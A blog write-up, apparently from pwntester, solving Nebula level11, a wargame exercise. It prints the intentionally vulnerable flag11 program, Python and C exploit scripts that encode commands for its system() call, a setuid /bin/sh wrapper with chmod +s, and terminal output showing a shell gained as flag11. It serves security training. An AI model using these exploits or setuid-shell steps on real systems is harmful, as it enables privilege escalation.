@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Nebula level11 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In Level11 we are given the following code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; /* * Return a random, non predictable file, and return the file descriptor for it. */ int getrand(char **path) { char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv(&amp;quot;TEMP&amp;quot;); pid = getpid(); asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, &#39;A&#39; &#43; (random() % 26), &#39;0&#39; &#43; (random() % 10), &#39;a&#39; &#43; (random() % 26), &#39;A&#39; &#43; (random() % 26), &#39;0&#39; &#43; (random() % 10), &#39;a&#39; &#43; (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd; } void process(char *buffer, int length) { unsigned int key; int i; key = length &amp;amp; 0xff; for(i = 0; i &amp;lt; length; i&#43;&#43;) { buffer[i] ^= key; key -= buffer[i]; } system(buffer); } #define CL &amp;quot;Content-Length: &amp;quot; int main(int argc, char **argv) { char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) { errx(1, &amp;quot;reading from stdin&amp;quot;); } if(strncmp(line, CL, strlen(CL)) !">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Nebula level11 write-up">
+    <meta name="twitter:description" content="In Level11 we are given the following code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; /* * Return a random, non predictable file, and return the file descriptor for it. */ int getrand(char **path) { char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv(&amp;quot;TEMP&amp;quot;); pid = getpid(); asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, &#39;A&#39; &#43; (random() % 26), &#39;0&#39; &#43; (random() % 10), &#39;a&#39; &#43; (random() % 26), &#39;A&#39; &#43; (random() % 26), &#39;0&#39; &#43; (random() % 10), &#39;a&#39; &#43; (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd; } void process(char *buffer, int length) { unsigned int key; int i; key = length &amp;amp; 0xff; for(i = 0; i &amp;lt; length; i&#43;&#43;) { buffer[i] ^= key; key -= buffer[i]; } system(buffer); } #define CL &amp;quot;Content-Length: &amp;quot; int main(int argc, char **argv) { char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) { errx(1, &amp;quot;reading from stdin&amp;quot;); } if(strncmp(line, CL, strlen(CL)) !">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Nebula level11 write-up">
+  <meta property="og:description" content="In Level11 we are given the following code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; /* * Return a random, non predictable file, and return the file descriptor for it. */ int getrand(char **path) { char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv(&amp;quot;TEMP&amp;quot;); pid = getpid(); asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, &#39;A&#39; &#43; (random() % 26), &#39;0&#39; &#43; (random() % 10), &#39;a&#39; &#43; (random() % 26), &#39;A&#39; &#43; (random() % 26), &#39;0&#39; &#43; (random() % 10), &#39;a&#39; &#43; (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd; } void process(char *buffer, int length) { unsigned int key; int i; key = length &amp;amp; 0xff; for(i = 0; i &amp;lt; length; i&#43;&#43;) { buffer[i] ^= key; key -= buffer[i]; } system(buffer); } #define CL &amp;quot;Content-Length: &amp;quot; int main(int argc, char **argv) { char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) { errx(1, &amp;quot;reading from stdin&amp;quot;); } if(strncmp(line, CL, strlen(CL)) !">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/11/24/nebula-level11-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/11/24/nebula-level11-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Nebula level11 write-up</h1>
+      <p class="post-meta">@pwntester · Nov 24, 2013 · 6 min read</p>
+    </header>
+    <article class="post-content"><p>In <a href="http://exploit-exercises.com/nebula/level11">Level11</a> we are given the following code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+
+/*
+ * Return a random, non predictable file, and return the file descriptor for it.
+ */
+
+int getrand(char **path)
+{
+  char *tmp;
+  int pid;
+  int fd;
+
+  srandom(time(NULL));
+
+  tmp = getenv(&quot;TEMP&quot;);
+  pid = getpid();
+
+  asprintf(path, &quot;%s/%d.%c%c%c%c%c%c&quot;, tmp, pid,
+    'A' + (random() % 26), '0' + (random() % 10),
+    'a' + (random() % 26), 'A' + (random() % 26),
+    '0' + (random() % 10), 'a' + (random() % 26));
+
+  fd = open(*path, O_CREAT|O_RDWR, 0600);
+  unlink(*path);
+  return fd;
+}
+
+void process(char *buffer, int length)
+{
+  unsigned int key;
+  int i;
+
+  key = length &amp; 0xff;
+
+  for(i = 0; i &lt; length; i++) {
+    buffer[i] ^= key;
+    key -= buffer[i];
+  }
+
+  system(buffer);
+}
+
+#define CL &quot;Content-Length: &quot;
+
+int main(int argc, char **argv)
+{
+  char line[256];
+  char buf[1024];
+  char *mem;
+  int length;
+  int fd;
+  char *path;
+
+  if(fgets(line, sizeof(line), stdin) == NULL) {
+    errx(1, &quot;reading from stdin&quot;);
+  }
+
+  if(strncmp(line, CL, strlen(CL)) != 0) {
+    errx(1, &quot;invalid header&quot;);
+  }
+
+  length = atoi(line + strlen(CL));
+
+  if(length &lt; sizeof(buf)) {
+    if(fread(buf, length, 1, stdin) != length) {
+      err(1, &quot;fread length&quot;);
+    }
+    process(buf, length);
+  } else {
+    int blue = length;
+    int pink;
+
+    fd = getrand(&amp;path);
+
+    while(blue &gt; 0) {
+      printf(&quot;blue = %d, length = %d, &quot;, blue, length);
+
+      pink = fread(buf, 1, sizeof(buf), stdin);
+      printf(&quot;pink = %d\n&quot;, pink);
+
+      if(pink &lt;= 0) {
+        err(1, &quot;fread fail(blue = %d, length = %d)&quot;, blue, length);
+      }
+      write(fd, buf, pink);
+
+      blue -= pink;
+    }
+
+    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+    if(mem == MAP_FAILED) {
+      err(1, &quot;mmap&quot;);
+    }
+    process(mem, length);
+  }
+}
+</code></pre>
+
+<p>Analyzing the code, there are two different branches leading to the <strong>process()</strong> funcion call that eventually leads to the <strong>system()</strong> function call. This offers us two different ways to exploit this program.</p>
+
+<p>The first one is when the length specified in the <strong>Content-Length</strong> header is greater than 1024. In order to exploit this vulnerable path, we will need to provide the applciation with a valid header specifying a content length bigger or equal to 1024. We will fix the length to 1024 and analyze what we need to put in the content body to execute our arbitrary commands.</p>
+
+<p>If content length is bigger or equal to 1024, the program will open a random file descriptor and copy the contents of the content body to that file. Then, the contents of the file are read into a memory segment allocated in the process space. The last part of the application (<strong>process()</strong>) will decrypt the content body and use the decrypted content as a command to be run by <strong>system()</strong>.</p>
+
+<p>All we need to do is encrypt the command we want to run followed by a <strong>null</strong> byte and fill the rest of the 1024 block with any junk.</p>
+
+<p>The encryption is quite simple, it looks like a <a href="http://en.wikipedia.org/wiki/Stream_cipher">Stream cipher</a> where we encrypt a set of blocks (in this case, bytes) and we use the encrypted version of a block as the key to encrypt the following block.</p>
+
+<pre><code class="language-lang-clike">unsigned int key;
+int i;
+
+key = length &amp; 0xff;
+
+for(i = 0; i &lt; length; i++) {
+  buffer[i] ^= key;
+  key -= buffer[i];
+}
+</code></pre>
+
+<p>The value used as the <strong>content-length</strong> is used as the initial encryption key but it is anded with 0xff so we will only use the least significant byte. Then the cipher enters a loop where it decrypts one byte a time using the new key for every new block where the new key is calculated as the <strong>previous key - previous decrypted byte</strong></p>
+
+<p>We can code a python exploit to encrypt the <strong>getflag</strong> command and craft the packet to be sent to the <strong>flag11</strong> program:</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/env python
+
+command = &quot;getflag\x00&quot;
+length = 1024
+key = length &amp; 0xff
+
+encrypted = &quot;&quot;
+for i in range(len(command)):
+     enc = (ord(command[i]) ^ key) &amp; 0xff; # unsigned int
+     encrypted += chr(enc)
+     key = (key - ord(command[i])) &amp; 0xff # unsigned int
+
+print &quot;Content-Length: &quot; + str(length) + &quot;\n&quot; + encrypted + &quot;A&quot;*(length - len(encrypted))
+</code></pre>
+
+<p>Before trying to exploit it, lets define a new <strong>TEMP</strong> environment variable that the program will look for creating the random file:</p>
+
+<pre><code class="language-lang-bash">export TEMP=/tmp
+</code></pre>
+
+<p>Its time to exploit the <strong>flag11</strong> program:</p>
+
+<pre><code class="language-lang-bash">level11@nebula:~$ python exploit.py | /home/flag11/flag11
+blue = 1024, length = 1024, pink = 1024
+You have successfully executed getflag on a target account
+</code></pre>
+
+<p>A <strong>c</strong> version:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void process(char *buffer, int length) {
+  unsigned int key;
+  int i;
+
+  key = length &amp; 0xff;
+  for(i = 0; i &lt; length; i++) {
+    buffer[i] ^= key;
+    key -= buffer[i] ^ key;
+  }
+}
+
+#define COMMAND &quot;getflag&quot;
+
+int main(int argc, char *argv[]) {
+  char buffer[1024];
+
+  strncpy(buffer, COMMAND, 1024);
+  process(buffer, 1024);
+  puts(&quot;Content-Length: 1024&quot;);
+  fwrite(buffer, 1, 1024, stdout);
+  return 0;
+}
+</code></pre>
+
+<p>If we want to get a shell we can use the following setuid shell wrapper:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void main(int argc, char *argv[]) {
+
+  uid_t euid = geteuid();
+  setresuid(euid, euid, euid);
+  system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+
+<p>Now, modify the python exploit to execute the following command:</p>
+
+<pre><code class="language-lang-bash">command = &quot;gcc -o /tmp/shell /tmp/shell.c; chmod +s /tmp/shell\x00&quot;
+</code></pre>
+
+<p>Run the exploit and look for our setuid shell on /tmp:</p>
+
+<pre><code class="language-lang-bash">level11@nebula:~$ python exploit.py | /home/flag11/flag11
+blue = 1024, length = 1024, pink = 1024
+level11@nebula:~$ ls -la /tmp
+total 28
+drwxrwxrwt  4 root    root    4096 Nov 24 11:50 .
+drwxr-xr-x 22 root    root    4096 Dec  6  2011 ..
+drwxrwxrwt  2 root    root    4096 Nov 23 21:10 VMwareDnD
+-rwsrwsr-x  1 flag11  level11 7241 Nov 24 11:50 shell
+-rw-rw-r--  1 level11 level11  180 Nov 24 11:48 shell.c
+drwx------  2 root    root    4096 Nov 23 21:10 vmware-root
+</code></pre>
+
+<p>Run the shell:</p>
+
+<pre><code class="language-lang-bash">level11@nebula:~$ /tmp/shell
+sh-4.2$ id
+uid=988(flag11) gid=1012(level11) groups=988(flag11),1012(level11)
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+</code></pre>
+
+<p>Voila!! but we also mentioned that there was a second branch leading to the command execution. If content length is smaller than 1024, then <strong>fread</strong> will read one block of &ldquo;length&rdquo; bytes and return the value of blocks read, that will always be <strong>1</strong>. So if we want to avoid the <strong>err</strong> call, we need to set the length to <strong>1</strong>. The problem is that if length is <strong>1</strong> our exploiting proabibilities decrease :(
+We can create a bash script named with only one letter like &ldquo;e&rdquo;:</p>
+
+<pre><code class="language-lang-bash">level11@nebula:~$ cat e
+#!/bin/bash
+getflag
+</code></pre>
+
+<p>Now we will create a modified version of our exploit for content-length <strong>1</strong>:</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/env python
+
+command = &quot;e&quot;
+length = 1
+key = length &amp; 0xff
+
+encrypted = &quot;&quot;
+for i in range(len(command)):
+        enc = (ord(command[i]) ^ key) &amp; 0xff; # unsigned int
+        encrypted += chr(enc)
+        key = (key - ord(command[i])) &amp; 0xff # unsigned int
+
+print &quot;Content-Length: &quot; + str(length) + &quot;\n&quot; + encrypted + &quot;A&quot;*(length - len(encrypted))
+</code></pre>
+
+<p>Our <strong>e</strong> script will be encrypted to <strong>d</strong> so that <strong>flag11</strong> will decrypt it back to <strong>e</strong>. The problem is that we dont have room for the null byte to delimit the command to be executed so we depend on the our luck to get a <strong>00</strong> in the right place:</p>
+
+<pre><code class="language-lang-bash">level11@nebula:~$ python exploit1.py | /home/flag11/flag11
+sh: $'e\020Z': command not found
+level11@nebula:~$ python exploit1.py | /home/flag11/flag11
+sh: $'eP\357': command not found
+level11@nebula:~$ python exploit1.py | /home/flag11/flag11
+sh: $'e0\247': command not found
+level11@nebula:~$ python exploit1.py | /home/flag11/flag11
+getflag is executing on a non-flag account, this doesn't count
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/nebula11"><span class="tag">Nebula11</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2160</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
